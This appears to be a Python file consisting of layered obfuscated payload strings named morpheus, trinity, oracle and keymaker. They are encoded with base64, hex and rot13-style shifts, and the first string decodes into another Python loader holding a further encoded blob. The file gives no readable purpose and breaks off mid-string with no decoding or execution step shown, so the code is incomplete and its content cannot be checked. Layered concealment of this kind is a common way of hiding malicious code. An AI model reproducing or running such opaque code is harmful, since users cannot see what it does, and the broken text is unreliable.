import base64, codecs

morpheus = 'aW1wb3J0IGJhc2U2NCwgemxpYiwgY29kZWNzLCBiaW5hc2NpaSwgc2l4Cgptb3JwaGV1cyA9ICc2NTRhNzk3NDU3NzQ3NTRmNmYzMTY5NTc2NjYzMmI3NjcxNGM2NjczMzE3MjUyNDc1ODRmN2E3Mzc0NDQ1MTM5MzA2ZTQ3NDM3NTVhNjg2YTQyNzg2NTYyNDE0ZTU3NGM2NzMzNTEzNDQ0NDE1YTQ0NTY0NDY3NGQ2NjUwMzI3MzY0NTk2YTRkNzI0MjcxMzEzNTZkNmI2NTUxNmIzNzY3NTg1MDVhNjUyYjM3NzAzMjMxNjI2Yzc1NzIzNjM5NzY3NjdhMzA2NDJmNmE2ODJiNmQ2NjMzNmE3NDJiNGMzNjJmNTY2YTM4Mzg2NTZjNTQ2NjU4MzE3NDU4MzQzNjMzNTAzMzM3MzczMTMyMmI2NjQ0MzY2YzJiNjY3YTRhMzk3YTU4NTAzODZjMzg0YzU5NDc1YTc0NzYzOTM5NGY3ODM3NzQ3NjczNjY0NDM5NmM3ODcxNGM0YjMwMzgzMDU5NjY0Njc1NjU0NDJiNmI2MzMzN2E2Njc0NDk2MjM2NjY0Mzc1NGQ3OTJiMzM1YTcxMzMzNzQ0NzY2NjZlNDQzMjY1NmE0NzQ5Njg2NjYzNGU1ODM1NTA2ZjVhNTQ0ZTU3MzU3MzYyNjEzNDUzMzg2MjVhNTk0YTMzNmY3YTMxNzU3MjU3Nzk0ZjM5Mzg2MTZkNzg0Yzc2NjE0ZDdhNjU2YzQ4NDQ1YTU3NGQ1NzU0NmMyZjZiNTc0ZjUxNzA2NTZjNzY0NzJmNGI1NTRhNjM0YTM5NmE2ZDY4NzU1NTMxMzI2MzM2Nzc3YTM4Njk1MzcxNGU3MjU4NTU3NDMxNjE2ZjYyNTM3NzYyMmIzODUwMzU0YTczNDcyZjUyMzY2ZTY4MzMzMTcwNjU1YTcyNGY0ZTczMzk1MDZjNGI0NzY1MzQ0NTM4Mzg1MzVhMzk3NTYxNGM0MTc1NzMzODYyNjg3NTMzNDY2NzZlNmU0Njc2Njc3NjQ3N2E0OTc5MzY0YzY2NDc1MDY3MmI0NjZlNTA0OTRkNDU0OTY1NjY1NjRlNmUzNDdhNTk0YTQ0NTU2ZDM1NmIzODc5NTUzNDMwNmU2MjRhNjg2ZTU3NTM0NzRlNmE3OTUyMzc3NjQ0NjU3OTJmMzQ3ODc2NmI3YTUwNDI3MzM4MzEzNTMxMmY2YTYxNTIzODMwMzI0ZTY1NzkzMzY1NmQzMDQ4NGY3NjRlMzY0ZDQ3NjY1ODQ0NjU1MzQ4NmI0MjUyMzY2YzY4MmY1MDM5NjU3NTRlNDEzNzc4NDYzNjZhNzc0YzZlNWE3MzQ0NDY2NzJmMzc1OTU2MzM3NTUxNDU2NTYzNmM0OTY1Mzc2ZTY2NjQ1MTU0NzU0ZTU3Mzc2NzY2NzA0MTQ4NzU3Nzc2NGU0ZDZmNmU1MjM5Njc2ZTY3NjQ3YTM0MzU1ODc2Njc2ODU4MzA2ZTRjNTM2NjRmNzA1NzY0NmI0OTMzNDUyYjM0NjI2NjQxNTc1MTU4Nzg0NzUwNDc0Yzc0NTE2ZjUwNDkzNzY2Mzg3MzJiNTIzOTRhNjY1OTcwMmY2NjRlNzE0ZDM0NTkzNjVhNDk2NTM5NjE0Mzc1MmYzNTcyNmU1MTQ3MzM0YjY1Mzg0NDM0NzE2NzVhMmY0MjczN2E2MTU3NzAzMjJiNDk0ZDM3NDQ0MzMyNzY3NTZkNzg2YTM0NzI3NTZiNDE2ZDQ0NjY1YTUyMzc3OTQ1NDgzNzUxNzIzOTQ5MzkzNTZhNjI2OTMzNTk3YTM2NDgzOTczNGMyYjMyNjU2NDM4NGM2NDY0Njc2ZDMwNTc1NzU0NTY0YTQzNDgzOTc4NTMzNDRhNzg3NzZmNDgyZjU0NzE2NzUxNjYzMDMzNmQ0NTc0MzE2Yzc1Mzg0MzMzNWE0OTM5NjkzOTM0NjIzMjYyNTUzMDJmNDczMDcyNDE1MjJiNGU2MjQ1NzA2NzQ5NTU0ZTMyNTU0YTY5NDE2YTc2NmU0ZjQ0NjM3YTZjNGMyYjU2NmM1MTM3NjM2NzQ5NGQ0ZTRmNjI0OTQyNzY3YTZhNDg1MDM5NGY1MDVhNDU0YjM1NGQzOTcyNGU2ZDQ4Nzg0YTJiNWE2YjRhNTA0ZjQ3NDg2YzYxNjIzODRlNjc0ODY1NDM2NTc5NWEzMDRjNjI3NzY4NmM0ODcwNDQyZjJiNDQ1MDUzMzMzNDZhMzQ0ZTM5Mzg0MTZlNDk0MzU0NmQ2NzUwMzI3OTQ3Mzk2NjQ0MmY1MTczNzU1MzYyNDU1OTJmNzc2YTMwMzE2MzQ5NTA2MzM5NGI1NzY0NTQ3MTdhNzg1ODczMmI1NTQ0NjU0NjZhNDM2NjUzNzU2NDM2NGYzMDQ5NzY2ZjQ4Mzc0YzU4NDQ3NTUyNmUzMjUyMzI2NjM2NzY2NjRhMzE0YTM0NTM2NDM2NTkyZjM0NjQzNTRiNTg0NzJiNzI0NTJiMzI0MjZlNzE2NTQ5NGU2NjZiNTAzNzRmNzE0NzUyNDU2NjJiNmI3NzQ4NmQ2ODcwNzU1MzMxNzc2YTZlNzU0ZDM1NTc2NjZhNDU3MDU4MzI0ZDZiNDQ1NDc2Njc0NjUwNjg3NjYxNjg2NjM0NDM3NjM5NzMzNDMwNDM0ZDRhNjUzOTc4NGEzMzQzNDEyZjY2NTc0YTQ4NDczMDQyNzUzMzRmNmM2YjU3NGQ2NjM0NTkzMTdhNTM3YTM2NmI3NjJmNGU0NzY4NmU1OTQxNjIzOTU2NTA3OTY4Mzg0MzJmNzU0MTRkNzg3ODZiNGYzNTRiNjU0NTJmNTkzMTU0NTQ0ODc5NTQ3NjRkNTc3YTczNTIzNzc5NTAzMDQ4NzYzODJmNzE0YzM4NTk2YzUyMmI1YTRiNmYzNDQ3NGY0NTMzNzk2ZDM2NGQ0YTMzNzgzMzQ3NGQyYjMwNmQzOTUxNTY0YzZmNmU0MTY0Mzk2ZjYyMmY3MzM3Mzg2ZjRlNTk3OTYyNzk2YTM1NjM1NDJmNmE2NzUwNDY3MTM0N2E3NjM4Nzc0YjcxNDk2ODM2NDg3Mzc3NjY2NzcwNjQyZjQzNDgzMzU5Nzg3ODZjNmM3NTUxNGUzNDQ4NjY2YzUwNTQ0ODZlNWE1OTcwNjYzNjQ5MmYzMDMxNjE0ZDRkNjU0YTQ5NjUzMTQ2NTA3ODY5NzkyYjQ5MzAzNjMyNmE0NjU4NGM2NzMxNzgzODc4MzM3NzQxNmU0MjRjNmI0ZTc2NzE3ODUxMmYzMDZmNDgyYjRkNTM2MzczNGQzMjZiNzY0NzRkMmY1NDZjNmE0MTMzNmE2OTJmNDgzNzc5MzI1ODQ0MzY3MDU0Mzg2Yjc5NmYzNjRkNjM2NjZmNTgzODRhNDUzNjM1NGEzNTc2NTU3NTQzNTQ0OTQxMzU0ODJiNjgzMzU4Mzg3YTc2Nzk0MzU4NGI3MzVhNTAzNjQxNDg0NDZjMzk2NDRiNTI2MzM5NDY1ODY5NTQ2NjJiNTQ0YjcwMzY2NzcwMzA2ZDY0Njc0NDc2N2EzMzVhNzgzNDVhNmY3YTZlNjg1MDZkNTI2MzUzNzY3MDQyMzM0ZjQ2NTAzMzRkNDIzODc2NTk1NzU3NDcyYjU5NjYzODc0NGEyZjZkNzg0NTMzNmI0MjM4NTU1NTY2NTk3NzVhN2E3OTRmNjU0ZjU2NjU1NjczNjk0ODY3NzY2ZDQzMzkzNDQ0NjYzODM0NTk0YTJmNzI2YjYyN2EzNzc0NDQ3Njc5NDk0NzdhNDI2YjUwNGE2MzMyMmY1NTU0NDY0MjdhNDM2ZTQ4MzU3NjRiNzQzNTMwNTEzOTMwNDQ1MDMxNDU1YTY1NTI1NDc3NmI0MTZlMzY0NTM4NzkzMzcxNDQ1ODJiNzI0YTY2NDk2YzM5NjEyYjZkNTA0OTM0MzQ3ODQ4MzE3YTc4NmEzMzZiMzc'
trinity =  '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IrT5cZwAwBT9QAGSKpGqDH0A3nyE1ZwV2F1umA2gcDKbkY2LlMyAeMmIaZwyKIIOHF0V1MwyHEwVjX21Tnl9iBHyGBGAiL0gynwp1DHuvH2VipyucomEPM2giH2c1qHplBR1wEJ5FAwOFIvfkJSAap0Z3naLkLmN2LJ1mEHMSD1EiDz9FomIkqTSjAQp3n0jmFacyA213o1AQF2MuMTp0pHxmBJgaDwqepKS1rwRjqUEKnRAIE2RiE0xenTukJHcUo2pmq2WUIIWOBPgdoJ5VF01gJQLeGGSeMUykn3AyERW2H1A0AUcupGWQrz5IqKqEpwMhFKIbZaAIq2xmBIxkI1ucnHyIAGMEqP90ISHmLxtiE2gcozyuEyIZMRyRHQIvA2Euo0WcJGp5GGDepKOio2gZY0MyG3yQpGZiF3AWBUxmpGDkF0ADZl9PqxWgY2WfraOmDwElrUMYJwxkpJShnzc2ZHgMZQWcLJRmoJWaD002omWIM2IkrID5MJf2BSAgZwOHrUcWHyATA3S2D3q1ZRuXAQMdBH1GMJqbnPg4I1IeDH1kZxVlnGLlZ3L5FxywAmyMrKSmHPgaXlgMZHcbBTEALzgUp20kJyymBKWPompeq0AbqayyY25XoyIYpmWhJIx1Z2cdG2L3DxcyZwImDIWDD0gwDJplHmuIp2qgD0AGBPgXpT1zEayhoQWKFyu1rF9xX29cFwOgoP9aAQyWJz80H0IEpTfmox0kF0kyEHugEIRmH2IVHxSXFwOkDHMGrxI1GHb1HKqIpHMPMT9hGTcbHmp1IIqVHIqFHaI5EwIOrSOaoyqFI1LinaMcBKOiA3L5EIxkGySjHQH4F1u1owN2MGM1oJEIracPGHWBp2SzGJ9arx1ODGIHq3ukD3WDZ1Zmq21GMKOlZmAKrzSXZ1yxqTgjBHEZZIWEBQE0oIq6LJImrwMwX2WDoaEgMR5HnIuHITqDFJIRpyO0A2qREGIHDlfmZR9lXmRlHayLBKy3pH9gZH41BTRlLaShqyyyrUuEFJ0kH2I4HTqeH2ucEyD3AJ8jI2MZESImFUuan3IMFvpXo3WuL2kyVQ0tWmZ5ZmH0BQZ4ZmHmAGL3A2R3BGMzAJR2AwLmZmZ0ZGWzAwt0ZwH4Zmx1BGZ0ZmR0MwL3AQHmAGZmZzL1AGLkAmH2BQH0AGH1ZmZ5ZmRlMwp2ZmR0MGMzZmV3BGpmAzZ1AGD3AmD2ZGL5AwL2Lmp3AwD2LwZ1Zmx2LwHjAGN3BQEvAGHlLwpjAGR2BQZ3AQt2AQL5AJRmZGD0AwLlMwp3AQR3AGH5AGR0AGLkZmR0AQZmATR2BGEwZzV3AQMyA2R1ZwpkATR3AwWzAQt3LGpjZzV3AwplAzL2ZwL3AwZ0MwL1AwH1ZGZ2ATR3ZwHkAzH1AwpjAzV2MGH3AGZ0LGD4AzZ2LwZ0AmH3LGL4ZmN0MGIuAmp2AmZlAQL0MwZmAmt2ZGZ2AQtmZmHlAwt2BGEyZmR2ZmpmAzZ1AwZjAGR3AGMvAQLmZwHlAGZ1ZQIuAQVmAmp0AQ'
oracle = 'U2NDZlNmM2YjJiNGY2OTc1NzA3NTM2NjU2MjQ5NWE2NDcwNzM2ZTRmNGE3OTRmNGM0YTY1NzQ0OTc5NDI3MjQyNGQ2ODU2NzI3MTc0NDM2NDczNjk0ZTZkNzQzMDU2NTc1MTUyNjE2OTc1NmE0Mzc3NDY0YzQ5NDg2NDZlNmI0Njc1MzAzNjc5NGE0ZTM1NDgzMTZmNGI3NTZkNzU3OTQxNTg1MzcyNWE0NjUyNmQ2NzUyN2E2MjY0NjM3ODMxNmM1MjM5NjM0Nzc0NmY2MTc1NGM2ZDQ3NTg2ZTY2NTc0YjY4NjE3MTRmNmI0ZjJiNzg3MjM5MzY2ODY1Nzk0ZDcyMzU1MjMwMzc1NDU4NTg2NzM3NGQ3MjcxNTU0YzQ1NWE2NDRlMzU2YjZmMmI2NzYxNzk1NTRjNGE2NDZhNmI2NDc3NTAzMTU5NmIzNDMwNjY0ODU0NzUzNzc4NDI0YTY0NGY3NDZjNDkzNjYyNDc3MjM2N2E2ZTc0Nzc0ODMyNjM1YTcxNDMzNzU2NGY3OTQ0NTUzNDU2NjUzNDYzNzY3NTRlNTc0NzMzNDQ2ODc3NzQ1NDY5NTA0OTY0NGQ2OTU1NGQ3MjQ5NDQ3ODYxNWE3ODQ4MmI1MjZiNTYzMDM5NTc0NDc0Nzg0YzU0Mzc0NjYzNzM3MTQxNzQ3MDc3NGI2YzQ0NTQ2MjQ0NGM3MDJiNTQ0MzcyMzc2ZTZlNmY2NzczNDU0NjMwMzc3NTMyNDkzMTRjNTk0NDM4NDY1NjY5NDQ2YjY3NGUzNDZmNGY3NDMxNDY0OTczMzM3MDJiMzY2NjRjNDc2NTQ4MmIzODZkNTM0ZjU3NTc1YTM3NDk0Mzc1NmQ1NDU5NmM0Yzc1NjU3MDc3Nzk2Mzc1NDc2Mjc2Nzg1ODcwMzE3MjQxNTEyYjQ2NGI3OTYzNzkzNzUwNjI0YTRkNGM0OTRhNDIzMDM0NGEzMjRjMzA2ZTc4NDUzMTRlNGI2MzY3Nzk3NDU5NmI2NDMwNmMzNDM3Nzg1YTM3NGE3OTY5NjQyZjc5NjQ2ODU2NTYyZjUxNjI3ODU0NzA1MTcwNjI2NDcxNTc2OTUxNTY3NTM0NDYyZjU0NDg2MTcyMzY1NTM5NTk0MjM3MmY0Yzc5NGQ0YzUxNTY1NzJmNTY0ZTQ5NDk3MzU2Mzc0NjcyNTQ2OTczNjcyZjc3NjQzNzQ5MzQ3NTZkNTA3OTU1NmU1NDczNzM0ZDczNzI3Nzc0MzI1OTU4NDI2MTUxNTE2ZTRkNDc1MTc4MzI2MzUyNzM1MzcwNzk1ODQ2NGM3MjYxMzUzNTQ0NTY1MTM4MzY1MzYyNGE0ZDczNjc2MzJmMzA3NDM4NzA1MTZiMzQ1MjcwMzY2YTQyNTgzNzRhNmU1NDQxNmQ2MzMzNGI2YTc3MzU3NTUzNjc1YTRlMzU3NzQ3NTU1MTJmNmY1ODQ1NDk0MzM0NzM3NzM0NzE2ZDMyNzk0MTRjNGE1NjU5NmE1YTUxNTA2YjZjMzI0ZTRmNDc2ZDcwNmE1MzRiMzM1YTU0NDU1NTc5NzAzODc0NmQ1MzQ2Njk3NDU3NDI3NjU1MzMyYjc5NzE2ZDU4NGY1NTMyNmM2NzQ4NGY3MDM4NDQ2MzZlNjY1MDQxMmIzNDU0NTE2YTZkMzE2ODRkNjk2NjY4NTEzNzRmNjQ2YjcxNDM2ZDQ4NmQ2YTU5NTI0ZTMwMzU3MDRmNDY1NzczNDQ0NDU2NTY1NjQ1Nzk1NTM4NjM1YTcwNDQzODM2NzQzMTUyNTE0NjRjNDk2NDU0NTM1MDY5NGUzODM4NDY1NTY5NjIyZjUzNTU3OTQzMmIzMTU2NTI2ODZkNmI0OTM1NmI2YzRmNDM0NzY2NTE2ODQ3MmI2NTQ1NDE3NjRhNzc1NzczNDc0YTU3NGI1MzZkNWE1MjRkN2E1NjZkNzk2NDMwNzg0ZTRmNzA3YTUyNGY0MTU4NDI1MDc4NTc2ZDUzNTk3MTU2NGI2MjMwMzQ2YzRmNDI1NTY3NzkzMjUxNjU2Nzc2MzU2YjYyNTM1ODUwNmYzOTM4Nzg3MjY5NzA1NDJiNTQzMzc1NmI1YTc5MmI2MzUyMmY2YTY4NTg0OTc5NjY3OTQ2NzY1MzY1NGI1NDY2NzU1MzRjMzA3NTRmNTU0NDZlNDU1NTUxNjczNzZkNDI1NTM0NWE3OTU2NzkzNTc2Nzc0MjcyNTI0MjM2NmE3NjYxMzA1NDJmNjU2NDRmMmYzODUwMzk2ODZjNTIyYjcwNzY3OTU1NTUzNjRkNWE3YTM1NDY3MTQ3NzU0YTcwNjE3MTZmNDM3NTc5NDc3NTY1NzQ3MTYyNjY2OTUxNTY0ZDc5MzU1NTUwNzA0MzMwNzIzMDU3Mzc2MzUyNmY2Yzc5NDk3MDc4NGEyYjRlNTE1NDYyNDgzMDYxNTE3MjQ2MmI0ZDQ0MzM2YjU0NzM1MjdhMzI3MjM2NTE1ODczNzg0ODc1Njg2YTVhNGE1NTM3MzQ2YTUzNzEyYjRhNzI3MzU1Mzg0OTRmNTc0NTJiMzI3YTY1NmI0MTM4MzY1ODQ4MmI0YTM5NzgyYjY5NjQzNTc2Nzk1MDRhNjU3MTZiNjYyZjQ5MzUyYjczNDY0ZTU0NTc3MzYxNGEzODZhMmY2MTRiMzQ2ZTRiNzk1NTJmNDk2MjZhNGU0ZjU1MmIzOTcxNTg2MTRiNmQ1MDcyNzE2MTdhNGI3MDM3NGY2MjU2NTEzOTU5NDQzMzYzNmI2ZjMzNzE3NTZiNzI3MDMzNGM0YTY4MzkzODYyNGI3NTM5N2E1MzczMzI0YTQ2NTA0NzYzNzA3MDU5NGE3MDc5NDI2Yjc2MzQ2NzRjNjkzMzQ3NGY3NjRkMzIzNzZlNDIzMjZlNWE1MDZmMzA3MDY0NmQ3MDRiNWE3NTYzNzA3NDY5NjM2ZDcyMzI2ZjQ4NGQzNDRhNzc0ZDY5NzA0OTRmN2E0OTRmNzM1MzM4NDEzNDYxNzQ2MzQxNDc0NDdhNmY2Yzc2Nzc2ZTdhNDMyYjZiNDkzNTM2NDI2MzcxMzMzMzRkNDM2YTZlMzA2ODM4NjE0NDY0N2EzMDcxNzY2Yjc2NzA3OTY5NzM0MTcwNzE1OTU0NjQ3NzUwNTk1NDU0Njc2MzU2NTA3NDZmMzA3ODYzNmM3NzUwNzU1NzY4NTg1NDZlNTY0NDVhNTgzOTcwNmQ2YjdhMzc0ZDM3Mzg2YTc2Nzc2YjQ2NTIzNTM4Mzk2YTY5NGEzMDcwNjg1MDcwMzg2YjRlNzA3YTUzNGQ0YjM4NTI2Mjc5NjY2NzcwNTI2YTU2NzQ2ZjM1MzYzODUyMzAzMTMxNjkzNDJmNzA2ZjQ5NzA2ZTU0NzMzMjY4MzU3NzZjNzg0MjUwMzM0YzY3NmUzNjRlMzUzMDcxNjY2MzczMzk0ZjU1MzE0ZTM3NzgzNDU5MmI2ZTUwNTk3YTZlMzc0MTMyNjM1OTZmNGM2NTc5NjM1NjcwMzk2MzYxNzAzMDQyNGIzMzdhNDc2MjM2Njg2NDc4NzM2NTY5NTg2YzU0Mzc2YzJmMzI0YzQzNTE2NDZkNjQ1NTMxNTg3MzUxN2EzNTY5NTA3MDQ1NmEzNzQ3NzAzNTdhNjI2NjM2Mzc1ODRhNGQzOTVhNjU0NDczNTIzODM4NTM3YTc2MzU0NzZkNTQ1MzM5NmU1NzMyNjIzOTJmMzI1MjcxNTg0ODM5NjU0OTUwNjE2MjY0NjYzOTc1Njc0MTQxMzMzMTJmNmEzMzY2NjY2YzJiNmU3NTQ0N2E1NzY4NjYzMDcyNzk1NDVhNjk3MzM5NzI0NjY0Njc0YjRlNmU1MTM2N2E2YzY1NTg0NzRhNGM3MzY2MzYyYjM2NWE2ZjcxNmM2ZDY1MzU3NTc2NTU2OTYxMzU1MDM2NTczNjQ5MzAzNjZhNjY2NjJmMzU1NTQ4NTk2NjM2NTU0MjMxNjYzM'
keymaker = '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